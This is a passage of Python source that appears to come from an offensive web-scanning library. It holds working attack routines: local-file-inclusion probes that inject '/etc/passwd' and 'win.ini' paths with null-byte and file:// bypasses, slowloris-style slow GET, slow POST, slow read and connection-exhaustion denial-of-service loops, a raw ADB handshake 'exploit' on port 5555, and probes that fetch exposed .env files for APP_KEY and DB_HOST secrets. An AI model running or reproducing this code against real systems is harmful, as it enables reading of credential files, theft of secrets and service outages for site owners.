            extr.append(x)
          except:
            pass
         for x in extr:
          if x.split(':')[0] in l:
           extr.remove(x)
         extra={}
         if len(extr)!=0:
          for x in extr:
           a=x.split(':')[0]
           b=x.split(':')[1]
           extra.update({a:b})
        for lop in l:
         if lop!=i:
          extra.update({lop.split(':')[0]:lop.split(':')[1]})
        if ignore_values==True:
         for x in extra:
          extra[x]=""
        exec_result=exec_get(u,pl,based_on=based_on,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
        if exec_result[0]==True:
          x="parameter: '"+i+"' => [+]Vulnerable"
          vul.append((i,exec_result[1]))
          colr=Fore.GREEN
        else:
         x="parameter: '"+i+"' => [-]Not vulnerable"
         sec.append(i)
         colr=Fore.RED
        if logs==True:
         print (colr+x+Style.RESET_ALL)
       if post==True:
        if fresh==True:
         extr=[]
         user=random.choice(ua)
         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
         if target_form_action:
          j=0
          for x in k:
           if x["action"]==target_form_action:
            j=k.index(x)
          k=k[j:j+1]
         for x in k[form_index]['inputs']:
          try:
           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
            extr.append(x)
          except:
           pass
         for x in extr:
          if x.split(':')[0] in l:
           extr.remove(x)
         extra={}
         if len(extr)!=0:
          for x in extr:
           a=x.split(':')[0]
           b=x.split(':')[1]
           extra.update({a:b})
        for lop in l:
         if lop!=i:
          extra.update({lop.split(':')[0]:lop.split(':')[1]})
        if ignore_values==True:
         for x in extra:
          extra[x]=""
        exec_result=exec_post(u,pl,based_on=based_on,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
        if exec_result[0]==True:
         x="parameter: '"+i+"' => [+]Vulnerable"
         vul.append((i,exec_result[1]))
         colr=Fore.GREEN
        else:
         x="parameter: '"+i+"' =>  [-]Not vulnerable"
         sec.append(i)
         colr=Fore.RED
        #lst.update(reslt)
        if logs==True:
         print (colr+x+Style.RESET_ALL)
      except Exception as ex:
       break
    dic.update({form_index:{"Action":u,"Method":l1['method'],"Passed":vul,"Failed":sec}}) 
   return {"Payload":xp,"Based on":based_on_o,"Injection":injection,"Page":target_page,"Output":dic}

def valid_parameter(parm):
 try:
  float(parm)
  return False
 except:
  return True

def file_inclusion_link(u,null_byte=False,bypass=False,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
 '''
   this function is for FI vulnerability test using a link
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 if proxies:
  proxy={'http':'http://'+random.choice(proxies)}
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if cookie:
    heads={'User-Agent': us,'Cookie':cookie}
 else:
   heads={'User-Agent': us}
 if ("=" not in u):
  return (False,'')
 else:
  if target_os.lower()=="linux":
   l='{}etc{}passwd'
  else:
   l='c:{}windows{}win.ini'
  if bypass==True:
   l=l.format("./"*random.randint(1,5),"./"*random.randint(1,5))
  else:
   l=l.format("/"*random.randint(1,5),"/"*random.randint(1,5))
  if file_wrapper==True:
   l=''.join(random.choice((str.upper, str.lower))(c) for c in "file")+"://"+l
  if null_byte==True:
   l+="%00"
  try:
    r=requests.get(u.format(l),headers=heads,proxies=proxy,timeout=timeout, verify=False)
    if (len(re.findall(r'[a-zA-Z0-9_]*:[a-zA-Z0-9_]*:[\d]*:[\d]*:[a-zA-Z0-9_]*:/', r.text))>0) or (all( x in r.text for x in ["; for 16-bit app support","[fonts]","[extensions]","[mci extensions]","[files]","[Mail]"])==True):
     return (True,r.url)
  except Exception as e:
    pass
 return (False,'')
 
def file_inclusion(u,null_byte=False,bypass=False,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None): 
 res=[]
 if u.split("?")[0][-1]!="/" and '.' not in u.split("?")[0].rsplit('/', 1)[-1]:
    u=u.replace('?','/?')
 a=crawl(u,proxy=proxy,timeout=timeout,cookie=cookie,user_agent=user_agent)
 l=[]
 d=a.values()
 for x in d:
  if len(x[3])>0:
   l.append(x)
 o=[]
 for x in l:
  ur=x[1]
  if ur.split("?")[0] not in o:
   o.append(ur.split("?")[0])
   if ur.split("?")[0][-1]!="/" and '.' not in ur.split("?")[0].rsplit('/', 1)[-1]:
    ur=ur.replace('?','/?')
   for y in x[3]:
    if valid_parameter(y[1])==True:
     trgt=ur.replace(y[0]+"="+y[1],y[0]+"={}")
     q=file_inclusion_link(trgt,null_byte=null_byte,bypass=bypass,target_os=target_os,file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
     if q[0]==True:
      res.append(q[1])
 return res


'''
  the following functions are used to check any kind of Slow HTTP attacks vulnerabilities that will lead to a possible DoS.
'''

def build_get(u,p,timeout=5):
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,p))
    if ((p==443 ) or (p==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    return s

def headers_timeout_test(u,port=80,timeout=5,max_timeout=30,logs=True):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nMax interval: {}".format(u,port,timeout,max_timeout))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  return 0
 if i>0:
  j=0
  while True:
   try:
    j+=1
    if j>max_timeout:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    if logs==True:
     print("[+]Sleeping for {} seconds...".format(j))
    time.sleep(j)
   except:
    if logs==True:
     print("==>timed out at: {} seconds".format(j))
     break
    return j
  if j>max_timeout:
   if logs==True:
    print("==>Test has reached the max interval: {} seconds without timing out".format(duration))
   return j

def slow_get_test(u,port=80,timeout=5,interval=5,randomly=False,duration=180,logs=True,min_wait=1,max_wait=5):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nInterval between packets:{}\nTest duration: {} seconds".format(u,port,timeout,interval,duration))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print("[-]Connection failed")
  return 0
 if i>0:
  j=time.time()
  while True:
   try:
    ti=time.time()
    if int(ti-j)>=duration:
     break
    if logs==True:
     print("[*]Sending payload...")
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    t=interval
    if randomly==True:
     t=random.randint(min_wait,max_wait)
    if logs==True:
     print("[+]Sleeping for {} seconds...".format(t))
    time.sleep(t)
   except Exception as e:
    pass
    if logs==True:
     print("==>timed out at: {} seconds".format(int(ti-j)))
    return int(ti-j)
    break
  if int(ti-j)>=duration:
   if logs==True:
    print("==>Test has reached the max interval: {} seconds without timing out".format(duration))
   return int(ti-j)

def max_connections_limit(u,port=80,connections=150,timeout=5,duration=180,logs=True,payloads=True):
 l=[]
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nConnections to create: {}\nInitial connection timeout: {}\nTest duration: {} seconds".format(u,port,connections,timeout,duration))
 ti=time.time()
 while True:
  if int(time.time()-ti)>=duration:
   if logs==True:
    print("[+]Maximum time for test has been reached!!!")
    break
   return len(l)
  if len(l)==connections:
   if logs==True:
    print("[+]Maximum number of connections has been reached!!!")
   if returning==True:
    return connections 
   break
  try:
   so=build_get(u,port,timeout=timeout)
   l.append(so)
  except Exception as e:
   pass
  if payloads==True:
   for s in l:
    try:
     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    except:
     l.remove(s)
  if logs==True:
   print("[!]Sockets: {} Time: {} seconds".format(len(l),int(time.time()-ti)))

def build_post(u,p,timeout=5,size=10000):
 s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(timeout)
 s.connect((u,p))
 if ((p==443 ) or (p==8443)):
  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
 s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),size,u).encode("utf-8"))
 return s

def slow_post_test(u,port=80,logs=True,timeout=5,size=10000,duration=180,randomly=False,wait=1,min_wait=1,max_wait=5):
 i=0
 if logs==True:
  print("[*]Test has started:\nTarget: {}\nPort: {}\nData length to post: {}\nInitial connection timeout:{}\nTest duration: {} seconds".format(u,port,size,timeout,duration))
 try:
  s=build_post(u,port,timeout=timeout,size=size)
  i+=1
 except Exception as e:
  if logs==True:
   print("[-]Connection failed")
  return 0
 j=0
 if i>0:
  t=time.time()
  while True:
   if int(time.time()-t)>=duration:
    if logs==True:
     print("[+]Maximum time has been reached!!!\n==>Size: {}\n==>Time: {}".format(j,int(time.time()-t)))
    return int(time.time()-t)
   if j==size:
    if logs==True:
     print("[+]Maximum size has been reached!!!\n==>Size: {}\n==>Time: {}".format(j,int(time.time()-t)))
    return int(time.time()-t)
   try:
    h=random.choice(lis)
    s.send(h.encode("utf-8"))
    j+=1
    if logs==True:
     print("Posted: {}".format(h))
    if randomly==True:
     time.sleep(random.randint(min_wait,max_wait))
    if randomly==False:
     try:
      time.sleep(wait)
     except KeyboardInterrupt:
      if logs==True:
       print("[-]Cant send more\n==>Size: {}\n==>Time:{}".format(j,int(time.time()-t)))
      return int(time.time()-t)
   except Exception as e:
    if logs==True:
     print("[-]Cant send more\n==>Size: {}\n==>Time:{}".format(j,int(time.time()-t)))
    return int(time.time()-t)

def slow_read_test(u,port=80,logs=True,timeout=5,duration=180,randomly=False,wait=5,min_wait=1,max_wait=10):
  i=0
  if logs==True:
   print("[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nTest duration: {} seconds".format(u,port,timeout,duration))
  ti=time.time()
  try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,port))
    if ((port==443 ) or (port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if time.time()-ti>=duration:
      if logs==True:
       print("[+]Maximum time has been reached!!!")
      return int(time.time()-ti)
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),u).encode("utf-8"))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),u,q).encode("utf-8"))
      d=s.recv(random.randint(1,3))
      if logs==True:
       print("Received: {}".format(str(d.decode('utf-8'))))
      print("sleeping...")
      if randomly==True:
       time.sleep(random.randint(min_wait,max_wait))
      if randomly==False:
       time.sleep(wait)
     except:
      break
    s.close()
  except Exception as e:
    pass
  if logs==True:
   print("==>connection closed at: {} seconds".format(int(time.time()-ti)))
  return int(time.time()-ti)

def adb_exploit(u,timeout=5,port=5555):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((u,port))
        s.send(b"CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00") 
        c=s.recv(4096)
        s.close()
        if "CNXN" in str(c):
            return True
    except Exception as e:
        pass
    return False

def exposed_telnet(u,p=23,timeout=5):
 try:
  t=xtelnet.session()
  t.connect(u,p=p,timeout=timeout)
  t.destroy()
  return True
 except:
  pass
 return False

def exposed_env(u,user_agent=None,cookie=None,proxies=None,proxy=None,path="",brute_force=True,timeout=15):
 if brute_force==False:
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
  else:
   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
  try:
   if urlparse(u).path=="/":
    u+=path+'.env'
   elif len(urlparse(u).path)<1:
    u+=path+'/.env'
   else:
    u=u.replace(urlparse(u).path,path+'/.env')
   c=requests.get(u,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
   if ("APP_KEY=" in c) or ("DB_HOST=" in c):
    return (True,u)
  except:
   pass
  return (False,'')
 else:
  for x in env_paths:
   if proxy:
    proxy=proxy
   if proxies:
    proxy=random.choice(proxies)
   a=exposed_env(u,user_agent=user_agent,cookie=cookie,proxy=proxy,path=x,timeout=timeout)
   if a[0]==True:
    return a
  return (False,'')
